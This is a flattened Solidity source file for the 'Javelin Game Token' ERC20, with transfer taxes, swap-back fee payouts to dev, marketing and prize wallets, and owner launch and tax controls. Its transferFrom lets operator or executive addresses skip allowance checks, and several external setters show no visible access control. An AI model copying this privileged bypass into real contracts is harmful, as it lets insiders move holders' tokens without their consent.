2200         address indexed spender,
2201         uint256 amount
2202     );
2203 
2204     modifier swapping() {
2205         token().inSwap = true;
2206         _;
2207         token().inSwap = false;
2208     }
2209 
2210     constructor(
2211         string memory name_,
2212         string memory symbol_,
2213         address dev,
2214         address marketing,
2215         address prize
2216     ) EIP712(name_, "1") {
2217         uint256 nLen = bytes(name_).length;
2218         uint256 sLen = bytes(symbol_).length;
2219         assembly {
2220             if or(lt(0x1B, nLen), lt(0x05, sLen)) {
2221                 mstore(0x00, _LONG_STRING_)
2222                 revert(0x00, 0x04)
2223             }
2224         }        
2225         METADATA = name_.packTwo(symbol_);
2226         decimals = 18;
2227         ROUTER = token().init(initialize(dev,marketing,prize));
2228     }
2229 
2230     function initialize(address dev, address marketing, address prize) internal pure returns(TokenSetup memory ts) {
2231         ts = TokenSetup(
2232             129,
2233             3000000,
2234             2500,
2235             2500,
2236             2500,
2237             4000,
2238             4000,
2239             0,
2240             0,
2241             2000,
2242             0,
2243             dev,
2244             marketing,
2245             prize
2246         );
2247     }
2248 
2249     function name() public view virtual returns (string memory _name) {
2250         (_name,) = METADATA.unpackTwo();
2251     }
2252 
2253     function symbol() public view virtual returns (string memory _symbol) {
2254         (,_symbol) = METADATA.unpackTwo();
2255     }
2256 
2257     function totalSupply() public view virtual returns(uint256) {
2258         return token().totalSupply;
2259     }
2260 
2261     function balanceOf(address holder) public view virtual returns(uint256) {
2262         return holder.account().balance;
2263     }
2264 
2265     function transfer(address to, uint256 amount) public virtual returns (bool) {
2266         _transfer(_msgSender(), to, uint96(amount));
2267         return true;
2268     }
2269 
2270     function allowance(address owner, address spender) public view virtual returns(uint256) {
2271         return _allowance(owner,spender);
2272     }
2273 
2274     function nonces(address holder) public view virtual returns (uint256) {
2275         return holder.account().nonces;
2276     }
2277 
2278     function approve(address spender, uint256 amount) public virtual returns (bool) {
2279         _approve(msg.sender,spender,amount);
2280         return true;
2281     }
2282 
2283     function transferFrom(
2284         address from,
2285         address to,
2286         uint256 amount
2287     ) public virtual returns (bool) {
2288         address spender = _msgSender();
2289         if (!_isAuthorized(spender)) {
2290             _spendAllowance(from,spender,amount);
2291         }
2292         return _transfer(from, to, uint96(amount));
2293     }
2294 
2295     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
2296         address owner = _msgSender();
2297         _approve(owner, spender, _allowance(owner, spender) + addedValue);
2298         return true;
2299     }
2300 
2301     function decreaseAllowance(address spender, uint256 requestedDecrease) public virtual returns (bool) {
2302         address owner = _msgSender();
2303         uint256 currentAllowance = _allowance(owner, spender);
2304         if (currentAllowance < requestedDecrease) {
2305             revert FailedDecreaseAllowance(spender, currentAllowance, requestedDecrease);
2306         }
2307         unchecked {
2308             _approve(owner, spender, currentAllowance - requestedDecrease);
2309         }
2310         return true;
2311     }
2312 
2313     function permit(
2314         address holder,
2315         address spender,
2316         uint256 value,
2317         uint256 deadline,
2318         uint8 v,
2319         bytes32 r,
2320         bytes32 s
2321     ) public virtual {
2322         if (block.timestamp > deadline) revert PermitExpired();
2323 
2324         unchecked {
2325             address account = ecrecover(
2326                 computeDigest(
2327                     keccak256(
2328                         abi.encode(
2329                             PERMIT_TYPEHASH,
2330                             holder,
2331                             spender,
2332                             value,
2333                             _useNonce(holder),
2334                             deadline
2335                         )
2336                     )
2337                 ),
2338                 v,
2339                 r,
2340                 s
2341             );
2342 
2343             if (account == address(0) || account != holder) revert InvalidSigner();
2344 
2345             token().registry.allowances[account][spender] = value;
2346         }
2347 
2348         emit Approval(holder, spender, value);
2349     }
2350 
2351     function burn(uint256 amount) public {
2352         _burn(_msgSender(), uint96(amount));
2353     }
2354 
2355     function _allowance(address owner, address spender) internal view returns (uint256) {
2356        return token().registry.allowances[owner][spender];
2357     }
2358 
2359     function _isAuthorized(address spender) internal view returns (bool) {
2360         return spender.isOperator() || spender.isExecutive();
2361     }
2362 
2363     function _transfer(
2364         address from,
2365         address to,
2366         uint256 amount
2367     ) internal returns (bool success) {
2368         if (from == address(0)) revert InvalidSender(address(0));
2369         if (to == address(0)) revert InvalidReceiver(address(0));
2370 
2371         Storage storage data = token();
2372         Account storage sender = data.account(from);
2373         Account storage recipient = data.account(to);
2374 
2375         if (sender.Address == address(0)) from.register();
2376 
2377         if (recipient.Address == address(0)) to.register();
2378 
2379         (uint256 taxAmount, uint256 netAmount, uint256 swapAmount) = data._tx(
2380             sender,
2381             recipient,
2382             amount,
2383             data.inSwap
2384         );
2385 
2386         if (taxAmount == 0) {
2387             _update(sender, recipient, amount);
2388             return true;
2389         }
2390 
2391         _update(sender, address(this).account(), taxAmount);
2392 
2393         if (swapAmount > 0) {
2394             _swapBack(swapAmount);
2395         }
2396 
2397         _update(sender, recipient, netAmount);
2398         return true;
2399         
2400     }
2401 
2402     function _update(
2403         Account storage from,
2404         Account storage to,
2405         uint256 value
2406     ) internal virtual {
2407         uint96 amount = uint96(value);
2408         if (amount > from.balance) {
2409             revert InsufficientBalance(from.Address, from.balance, amount);
2410         }
2411         unchecked {
2412             from.balance -= amount;
2413             to.balance += amount;
2414         }
2415         emit Transfer(from.Address, to.Address, amount);
2416     }
2417 
2418     function _swapBack(uint256 value)
2419         internal
2420         swapping
2421     {
2422         Settings memory settings = token().settings;
2423         unchecked {
2424             address[] memory path = new address[](2);
2425             path[0] = address(this);
2426             path[1] = ROUTER.WETH();
2427 
2428             uint96 amountToSwap = uint96(value);
2429             uint96 liquidityTokens;
2430             uint16 totalETHShares = 10000;
2431 
2432             if (settings.autoLiquidityShare > 0) {
2433                 liquidityTokens = (amountToSwap * settings.autoLiquidityShare) / totalETHShares / 2;
2434                 amountToSwap -= liquidityTokens;
2435                 totalETHShares -= settings.autoLiquidityShare / 2;
2436             }
2437 
2438             uint96 balanceBefore = uint96(address(this).balance);
2439 
2440             ROUTER.swapExactTokensForETH(
2441                 amountToSwap,
2442                 0,
2443                 path,
2444                 address(this),
2445                 block.timestamp
2446             );
2447 
2448             bool success;
2449             uint96 amountETH = uint96(address(this).balance) - balanceBefore;
2450             uint96 amountETHBurn;
2451             uint96 amountETHPrize;
2452             uint96 amountETHMarketing;
2453             uint96 amountETHDev;
2454 
2455             if(settings.burnShare > 0) {
2456                 amountETHBurn = (amountETH * settings.burnShare) / totalETHShares;
2457             }    
2458 
2459             if(settings.prizeShare > 0) {
2460                 amountETHPrize = (amountETH * settings.prizeShare) / totalETHShares;
2461             }
2462             
2463             if(settings.marketingShare > 0) {
2464                 amountETHMarketing = (amountETH * settings.marketingShare) / totalETHShares;
2465             }
2466 
2467             if(settings.developmentShare > 0) {
2468                 amountETHDev = (amountETH * settings.developmentShare) / totalETHShares;
2469             }                
2470 
2471             if(amountETHBurn > 0) {
2472                 _burn(address(this), amountETHBurn);
2473             }
2474 
2475             if(amountETHDev > 0) {
2476                 (success,) = payable(settings.feeRecipients[0]).call{
2477                     value: amountETHDev,
2478                     gas: settings.gas
2479                 }("");
2480             }
2481 
2482             if(amountETHMarketing > 0) {
2483                 (success,) = payable(settings.feeRecipients[1]).call{
2484                     value: amountETHMarketing,
2485                     gas: settings.gas
2486                 }("");
2487             }
2488 
2489             if(amountETHPrize > 0) {
2490                 (success,) = payable(settings.feeRecipients[2]).call{
2491                     value: amountETHPrize,
2492                     gas: settings.gas
2493                 }("");
2494             }            
2495 
2496             if (liquidityTokens > 0) {
2497                 uint96 amountETHLiquidity = (amountETH * settings.autoLiquidityShare) / totalETHShares / 2;
2498                 ROUTER.addLiquidityETH{value: amountETHLiquidity}(
2499                     address(this),
2500                     liquidityTokens,
2501                     0,
2502                     0,
2503                     address(this),
2504                     block.timestamp
2505                 );
2506 
2507             }
2508         }
2509     }
2510 
2511     function _swapThreshold(uint16 value) external virtual returns(bool) {
2512         return value.thresholdRatio();
2513     }
2514 
2515     function _gas(uint24 value) external virtual returns(bool) {
2516         return value.gas();
2517     }
2518 
2519     function _ratios(uint48 value) external virtual returns(bool) {
2520         return value.ratios();
2521     }
2522 
2523     function _shares(uint80 value) external virtual returns(bool) {
2524         return value.shares();
2525     }
2526 
2527     function _recipients(bytes memory value) external virtual returns(bool) {
2528         return value.recipients();
2529     }
2530 
2531     function _identifiers(address Address, uint16 value) external virtual returns(bool) {
2532         return Address.identifiers(value);        
2533     }
2534 
2535     function _helpers(address Address, uint256 starts, uint256 ends) external virtual returns(bool) {
2536         return Address.helpers(starts,ends);
2537     }
2538 
2539     function _mint(address to, uint96 amount) internal virtual {
2540         Storage storage data = token();
2541         data.totalSupply += amount;
2542         unchecked {
2543             to.account().balance += amount;
2544         }
2545         emit Transfer(address(0), to, amount);
2546     }
2547 
2548     function _burn(address from, uint96 amount) internal virtual {
2549         Account storage account = from.account();
2550         if (amount > account.balance) {
2551             revert();
2552         }
2553         unchecked {
2554             account.balance -= amount;
2555             token().totalSupply -= amount;
2556         }
2557         emit Transfer(from, address(0), amount);
2558     }
2559 
2560     function _approve(address holder, address spender, uint256 value) internal virtual {
2561         _approve(holder, spender, value, true);
2562     }
2563 
2564     function _approve(
2565         address holder,
2566         address spender,
2567         uint256 value,
2568         bool emitEvent
2569     ) internal virtual {
2570         token().registry.allowances[holder][spender] = value;
2571         if (emitEvent) {
2572             emit Approval(holder, spender, value);
2573         }
2574     }
2575 
2576     function _spendAllowance(address holder, address spender, uint256 value) internal virtual {
2577         uint256 currentAllowance = _allowance(holder, spender);
2578         if (currentAllowance != type(uint256).max) {
2579             if (currentAllowance < value) {
2580                 revert InsufficientAllowance(spender, currentAllowance, value);
2581             }
2582             unchecked {
2583                 _approve(holder, spender, currentAllowance - value, false);
2584             }
2585         }
2586     }
2587 
2588     function _useNonce(address holder) internal virtual returns (uint256) {
2589         Account storage account = holder.account();
2590         unchecked {
2591             if (account.nonces >= type(uint64).max) account.nonces = 0;
2592             return account.nonces++;
2593         }
2594     }
2595 
2596     function token() internal pure returns (Storage storage data) {
2597         data = Token.data();
2598     }
2599 
2600 }
2601 // File: contracts/oz/token/ERC20/IERC20.sol
2602 
2603 
2604 // OpenZeppelin Contracts (last updated v4.9.0) (token/ERC20/IERC20.sol)
2605 
2606 pragma solidity ^0.8.19;
2607 
2608 /**
2609  * @dev Interface of the ERC20 standard as defined in the EIP.
2610  */
2611 interface IERC20 {
2612     /**
2613      * @dev Emitted when `value` tokens are moved from one account (`from`) to
2614      * another (`to`).
2615      *
2616      * Note that `value` may be zero.
2617      */
2618     event Transfer(address indexed from, address indexed to, uint256 value);
2619 
2620     /**
2621      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
2622      * a call to {approve}. `value` is the new allowance.
2623      */
2624     event Approval(address indexed owner, address indexed spender, uint256 value);
2625 
2626     /**
2627      * @dev Returns the value of tokens in existence.
2628      */
2629     function totalSupply() external view returns (uint256);
2630 
2631     /**
2632      * @dev Returns the value of tokens owned by `account`.
2633      */
2634     function balanceOf(address account) external view returns (uint256);
2635 
2636     /**
2637      * @dev Moves a `value` amount of tokens from the caller's account to `to`.
2638      *
2639      * Returns a boolean value indicating whether the operation succeeded.
2640      *
2641      * Emits a {Transfer} event.
2642      */
2643     function transfer(address to, uint256 value) external returns (bool);
2644 
2645     function burn(uint256 value) external returns (bool);
2646 
2647     /**
2648      * @dev Returns the remaining number of tokens that `spender` will be
2649      * allowed to spend on behalf of `owner` through {transferFrom}. This is
2650      * zero by default.
2651      *
2652      * This value changes when {approve} or {transferFrom} are called.
2653      */
2654     function allowance(address owner, address spender) external view returns (uint256);
2655 
2656     /**
2657      * @dev Sets a `value` amount of tokens as the allowance of `spender` over the
2658      * caller's tokens.
2659      *
2660      * Returns a boolean value indicating whether the operation succeeded.
2661      *
2662      * IMPORTANT: Beware that changing an allowance with this method brings the risk
2663      * that someone may use both the old and the new allowance by unfortunate
2664      * transaction ordering. One possible solution to mitigate this race
2665      * condition is to first reduce the spender's allowance to 0 and set the
2666      * desired value afterwards:
2667      * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
2668      *
2669      * Emits an {Approval} event.
2670      */
2671     function approve(address spender, uint256 value) external returns (bool);
2672 
2673     /**
2674      * @dev Moves a `value` amount of tokens from `from` to `to` using the
2675      * allowance mechanism. `value` is then deducted from the caller's
2676      * allowance.
2677      *
2678      * Returns a boolean value indicating whether the operation succeeded.
2679      *
2680      * Emits a {Transfer} event.
2681      */
2682     function transferFrom(address from, address to, uint256 value) external returns (bool);
2683 }
2684 
2685 // File: contracts/oz/interfaces/IERC20.sol
2686 
2687 
2688 // OpenZeppelin Contracts v4.4.1 (interfaces/IERC20.sol)
2689 
2690 pragma solidity ^0.8.19;
2691 
2692 
2693 // File: contracts/ERC20Token.sol
2694 
2695 
2696 /*
2697 
2698 JAVELIN - Telegram Game on Ethereum Network
2699 
2700 Telegram: https://t.me/javelingametoken
2701 Website: https://javelingames.io
2702 Twitter: https://twitter.com/javelingamecoin
2703 
2704              ..........................................................................             
2705         ....................................................................................        
2706      ..........................................................................................     
2707    ..............................................................................................   
2708   ................................................................................................  
2709  .................................................................................................. 
2710  .................................................................................................. 
2711  .................................................................................................. 
2712  ...............................     .............................................................. 
2713  ...........................            ........................................................... 
2714  ..........................               ......................................................... 
2715  .........................                 ........................................................ 
2716  .........................                 ........................................................ 
2717  ..........................               ......................................................... 
2718  ...........................              ......................................................... 
2719  .............................             ........................................................ 
2720  .........................................             ............................................ 
2721  ..........................................              .......................................... 
2722  ..........................................               ......................................... 
2723  .........................................                 ........................................ 
2724  .........................................                 ........................................ 
2725  ..........................................               ......................................... 
2726  ............................................             ......................................... 
2727  ...............................................     ....  ........................................ 
2728  ..........................................................             ........................... 
2729  ..........................................................               ......................... 
2730  ................................         .................                ........................ 
2731  ..............................            ................                ........................ 
2732  ..............................             ...............                ........................ 
2733  ..............................            ................               ......................... 
2734  ...............................           ................             ........................... 
2735  ...................................   ...   ...     ....  ........................................ 
2736  ..........................................               ......................................... 
2737  .........................................                ......................................... 
2738  .........................................                ......................................... 
2739  .........................................                ......................................... 
2740  .........................................                ......................................... 
2741  ...........................................             .......................................... 
2742  .............................................        ............................................. 
2743  .................................................................................................. 
2744  .................................................................................................. 
2745  .................................................................................................. 
2746   ................................................................................................  
2747    ..............................................................................................   
2748      ..........................................................................................     
2749         ....................................................................................        
2750              ..........................................................................             
2751 
2752 /*
2753 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x
2754 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x
2755 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x
2756 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x
2757 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x
2758 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x
2759 0000000000000000000OOkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOO000000000000000000x
2760 00000000000000koc;,......................................................................................,;cok00000000000000x
2761 00000000000xl,.                                                                                              .,lxO0000000000x
2762 000000000x:.                                                                                                    .;d000000000x
2763 0000000kc.                                                                                                        .ck0000000x
2764 000000x,                                                                                                            'x000000x
2765 00000x,                                                                                                              'x00000x
2766 0000O:                                                                                                                ;O0000x
2767 0000d.                                                                                                                .d0000x
2768 0000l                                ,,                ,,                       .loool,                                l0000x
2769 0000l                               ;xk:.             :kk:                     'dOkkkkx:                               c0000x
2770 0000l                             .:kOkkc.          .ckOkkc.                  ,xOkkkkkOkc.                             c0000x
2771 0000l                            .lkOkkkko.        .lkkkkkkl.                ;xkkkkkkOkkkl.                            c0000x
2772 0000l                           .okkkOkkOx'       .okkkOOkOd'                ....;dOkOOkkko.                           c0000x
2773 0000l                          'dkkkkkkOd'       'dOkkkkkOd'                      'dOkkkkkOd'                          c0000x
2774 0000l                         ,dOkkkkkko.       ,xOkkkkkko.                        .okOkOkkOx,                         c0000x
2775 0000l                        ;xOkkOkkkl.       ;xOkkkkkkl.              .....       .lkkkOOkOx;                        c0000x
2776 0000l                       :kOkkkkkkc.      .:kOkkkkOkc.              ,dxxxxc.      .ckOkkkkOk:.                      c0000x
2777 0000l                     .ckOkkkkkk:       .ckkkOkkOx;               ;xkkkkkkl.       :xOkkOkOkl.                     c0000x
2778 0000l                    .lkOkkOkOx;       .okkkkkkOx,              .:kOkkkkkkko.       ;xOkkOkkko.                    c0000x
2779 0000l                   .oOkkOkkOd,       .okkkkkkkd'              .ckOkkkkkOkkOd'       'dOkkOkkOd'                   c0000x
2780 0000l                  'dOkkkOkko.       ,dOkkOkkko.              .lkOkkkkkkkkkkOx,       .okkkkOkkd,                  c0000x
2781 0000l                 ,xOkkkkOko.       ;xOkkkkkkl.              .okkkkkkkkkkkkkkOx;       .lkkkOkkOx;                 c0000x
2782 0000l                ;xOkkOkkkl.       :kOkkOkkkc.              'dOkkkkkOo,ckOkkOkOkc.      .ckkkkkkOk:                c0000x
2783 0000l              .ckOkkkkOk:.      .ckOkkkkOx:              .,xkkOkOOko.  :xOkOkkOkl.       :kkkkkkkkc.              c0000x
2784 0000l             .lkOkkOOOx;       .lkkkkkkOx;              :dxOkkkkOkc.    ,xOkOkkkko.       ;xOkkkkOkl.             c0000x
2785 0000l            .okkkOkkOx,       .okkkkkkOd'             .ckOkkkkkOkc.      'dOkkkkkOd.       ,dkkkkkkko.            c0000x
2786 0000l           'dOkkOOkOd'       'dOkkOkkOo.             .lkOkkkkkOx;         .okOkkOkOd,       .dOkkkkkOd'           c0000x
2787 0000l          ,dOkOOkkko.       ,xOkkkkOkl.             .okkkOOkkOx,           .lkkkkkkOx;       .okkkkkkOx,          c0000x
2788 0000l         .oOkkOkkOx,       .dOkkkkkOx'             'dOkOkkkkOd'             'xOkOkkkOd.       'xOkOkkkOd.         c0000x
2789 0000l          'dOkkkkkko.       ,xOkkkkkko.           ,xOkkkkkkko.             .okkkkOkOx,       .oOkkkkkOd,          c0000x
2790 0000l           .okOkkkkOd'       'dOkkkOkkd'         ;xOkOOkkOkl.             .oOkkkkOkd'       'dOkkOkkkd'           c0000x
2791 0000l            .lkkkkOkOx,       .okkkkkkOd,      .:kkkkkkOkxc.             ,dOkkkkkko.       ,xOkkkkkko.            c0000x
2792 0000l             .ckOkkOkkx:       .lkOkkkkOx;    .lkOkkkkOx:.              ;xOkkkkOkl.       ;xOkkkOOkl.             c0000x
2793 0000l              .:kOkkkkOkc.      .ckkkkkkkk:. .okkkkkkOx,               :kOkkkkOkc.      .ckOkkkkOkc.              c0000x
2794 0000l                ;xOkkkkOkl.       :kOkkOkOkc;oOOkkkkOd'              .ckkkkkkkk:       .lkkkkkkOx;                c0000x
2795 0000l                 ,xkkOkkOko.       ,xOkkOOkkkkkkOkkko.              .lkkkkkkkx;       .okkkkkkOx,                 c0000x
2796 0000l                  'dOkkkOkkd'       'dOkkkkkkkkkkkkl.              .okkkOkkOd,       'dOkOOkkOd'                  c0000x
2797 0000l                   .okkkkkkOx,       .oOkkkkkkkkOkc.              'dOkOOkkOd'       ,dOkOkkkko.                   c0000x
2798 0000l                    .lkkkkkkOx;       .lkkkkOOkOk:               ,xOkkOkkko.       ;xOkkOkkkl.                    c0000x
2799 0000l                     .ckOkkkkOk:.      .ckkkkkOx;               :xOkkOkkkl.      .:kOkkkkkkc.                     c0000x
2800 0000l                       :xOkkkkOkl.      .:dxxxo,              .ckOkkkkOkc.      .ckkkkOkOk:                       c0000x
2801 0000l                        ,xOkkkkkko.       ....               .lkkkkkkOx;       .lkOkkkkOx;                        c0000x
2802 0000l                         'dOOkkkkOo.                        .okkkkkkOx,       .oOkkkkkOd,                         c0000x
2803 0000l                          .okkkkOkOd,                      'dOkkkkkOd'       'dOkkOOkkd'                          c0000x
2804 0000l                           .lkkkOkkOx:'...                .dOkkkkkko.       'xOkkkkOko.                           c0000x
2805 0000l                            .ckkkkkkkkkkx;                .ckOkkOkl.        .lkkkkOkl.                            c0000x
2806 0000l                             .:kkkkkOkOx,                  .:kkkkc.          .ckkkkc.                             c0000x
2807 0000l                               ;xOkkkOd'                     ;xk:.             :kx;                               c0000x
2808 0000l.                               'llllc.                       ',                ''                                l0000x
2809 0000d.                                                                                                                .d0000x
2810 0000O:                                                                                                                ;O0000x
2811 00000k,                                                                                                              'x00000x
2812 000000k,                                     hire.solidity.developer@gmail.com                                      ,x000000x
2813 0000000kc.                                                                                                        .ck0000000x
2814 000000000x:.                                                                                                    .:xO00000000x
2815 00000000000kl;.                                                                                              .;lk0O000000000x
2816 00000000000O00kdl:,'....................................................................................',:ldk00000000000000x
2817 0000000000000000000OOOkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOO0000000000000000000x
2818 0000000000000000000000000000000000000000O0000000OOO000000000000000000OO000O0000000000000000000000000000000000000000000000000x
2819 000000000000000000000000000000000000000000000kdddddk00000000000000OxddddxO00000000000000000000000000000000000000000000000000x
2820 00000000000000000000000000000000000000000000O:    .cO0000000000000o.    ,k00000000000000000000000000000000000000000000000000x
2821 0000000000000O0000O00000000000O00O0000000000O;     :O0000000O000O0o.    'x0000000000000000000000O000000000000O00000000000000x
2822 00000000000kxddddxxO00000000OkddddddddxO0000O;     :O0000Oxddddddx:     'x0O00OkxdddddddxO00000kdddddkO0000kxddddkO000000000x
2823 00000000Oo;..     ..;dO00Ox:..        ..;dO0O;     :O0Od;..             'x0Oxc'.        ..;oO00c.    ;O0000c.    ;O000000000x
2824 0000000k:     .:c:'  .o0Ol.     '::,.    .cOO;     :0Oc.    .,::cc,     'x0o.     '::;.     :O0:     ,O0000:     ,O000000000x
2825 0000000o.    .x000Oc..cOk'     cO000o.    .xO;     :0d.    .o00000o.    'kO,     :O000d.    .o0:     ,O0000:     ,O000000000x
2826 0000000o.     'lxO0OkkO0x.    .o0O00x.    .d0;     :0o.    'x0OOO0o.    .kk'     l0000k'    .l0:     ,O0000:     ,O000000000x
2827 0000000kc.      .'cdO0O0x.    .o0O00x.    .dO;     :0o.    'x0O0O0o.    .kk'     .;;;;,.    .l0:     ,O0000:     ,O000000000x
2828 00000000Oxl,.       .ck0x.    .o00O0x.    .d0;     :0o.    'x0OOO0o.    .kk'      ..........'d0:     ,O0000:     ;O000000000x
2829 000000000000ko:.      :0x.    .o00O0x.    .d0;     :0o.    'x00000o.    'kk'     ckkkkkkkkkkkO0:     ,O0000:     l0000000000x
2830 0000000d:,ck0O0k;     ,Ox.    .o0OO0d.    .d0;     :0o.    .x00000l     .kk'     c0000O00kc,:x0:     ,O0O0O:    ;k0000000000x
2831 00000O0d.  ,oddl.    .l0O:     .cddl'     ;OO;     :0k,     'loddc.     'x0c     .:oddddo;  ,k0:     'dddo:.  .ck00000000000x
2832 0000000Oo'          'oO00Ol.            .ck0O;     :O0k:.         .     'x0Oo'            .;x00:           .'cx0000000000000x
2833 000000000OdlcccccclxO000000Odlccccccccldk000Odcccccd0000kocccccccdxlccccoO0O0OdlcccccccccoxO000xcccccccccloxO000000000000000x
2834 000000000O000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x
2835 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x
2836 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x
2837 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x
2838 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x
2839 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x
2840 OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO0d
2841 */
2842 
2843 pragma solidity ^0.8.19;
2844 
2845 
2846 
2847 contract MERC20 is ERC20 {
2848 
2849     using Token for *;
2850 
2851     error OwnableUnauthorizedAccount(address account);
2852     error OwnableInvalidOwner(address owner);
2853 
2854     event Connected(address indexed Address, uint256 indexed PID, uint256 indexed CID);
2855     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
2856 
2857     modifier onlyOwner() {
2858         _checkOwner();
2859         _;
2860     }
2861 
2862     constructor(address dev, address marketing, address prize) ERC20("Javelin Game Token", "JVL", dev, marketing, prize) {
2863         _mint(address(this), uint96(1000000000*10**18));
2864         _transferOwnership(msg.sender);
2865     }
2866 
2867     receive() external payable {}
2868 
2869     function deposit() external payable {}
2870 
2871     function _checkOwner() internal view {
2872         if (owner() != _msgSender()) {
2873             revert OwnableUnauthorizedAccount(_msgSender());
2874         }
2875     }
2876 
2877     function owner() public view returns (address) {
2878         return token().owner;
2879     }
2880 
2881     function _transferOwnership(address newOwner) internal {
2882         Storage storage db = token();
2883         address oldOwner = db.owner;
2884         db.owner = newOwner;
2885         emit OwnershipTransferred(oldOwner, newOwner);
2886     }
2887 
2888     function settings() external view returns(Settings memory) {
2889         return token().settings;
2890     }
2891 
2892     function account() external view returns(Account memory) {
2893         return account(msg.sender);
2894     }
2895 
2896     function account(address user) public view returns(Account memory) {
2897         return user.account();
2898     }
2899 
2900     function connect(uint256 id) external returns(uint256) {
2901         Account storage user = _msgSender().account();
2902         if(user.PID == 0) { 
2903             user.PID = token().PID++;
2904             if(user.Address == address(0)) user.Address = _msgSender();
2905         }
2906         emit Connected(msg.sender, user.PID, id);
2907         return id;
2908     }
2909 
2910     function recoverETH() external {
2911         Settings memory sdb = token().settings;
2912         uint256 amount = address(this).balance;
2913         (bool sent,) = payable(sdb.feeRecipients[0]).call{value: amount, gas: sdb.gas}("");
2914         require(sent, "Tx failed");
2915     }
2916 
2917     function recoverERC20() external {
2918         recoverERC20(IERC20(address(this)));
2919     }
2920 
2921     function recoverERC20(IERC20 _token) public {
2922         Settings memory sdb = token().settings;
2923         uint256 amount = _token.balanceOf(address(this));
2924         _token.transfer(sdb.feeRecipients[0], amount);
2925     }
2926 
2927     function initLiquidity() external payable swapping onlyOwner {
2928         Storage storage data = token();
2929         uint256 tokenBalance = balanceOf(address(this));
2930         _approve(address(this), address(ROUTER),type(uint256).max, false);
2931         _approve(address(this), address(this),type(uint256).max, false);
2932         ROUTER.addLiquidityETH{value: msg.value}(
2933             address(this),
2934             tokenBalance,
2935             0,
2936             0,
2937             address(this),
2938             block.timestamp
2939         );
2940         data.PAIR = IPair(ISwapFactory(ROUTER.factory()).getPair(address(this), ROUTER.WETH()));
2941         address(data.PAIR).register();
2942         address(data.PAIR).setAsMarketmaker();    
2943         _approve(address(this), address(data.PAIR),type(uint256).max, false);
2944     }    
2945 
2946     function toggleIdentifier(address _address, uint8 idx) external onlyOwner {
2947         _address.toggleIdentifier(idx);
2948     }
2949 
2950     function isLaunched() external view returns(bool) {
2951         return token().launched;
2952     }
2953 
2954     function startLaunch() external onlyOwner {
2955         token().launched = true;
2956     }
2957 
2958     function disableFairMode() external onlyOwner {
2959         token().settings.fairMode = 0;
2960     }
2961 
2962     function decreaseTax() public onlyOwner {
2963         Settings storage sdb = token().settings;
2964         sdb.buyTax -= 500;
2965         sdb.sellTax -= 500;
2966         sdb.transferTax -= 500;
2967     }
2968 
2969     function renounceOwnership() public onlyOwner {
2970         _transferOwnership(address(0));
2971     }
2972 
2973     function transferOwnership(address newOwner) public onlyOwner {
2974         if (newOwner == address(0)) {
2975             revert OwnableInvalidOwner(address(0));
2976         }
2977         _transferOwnership(newOwner);
2978     }
2979 
2980 }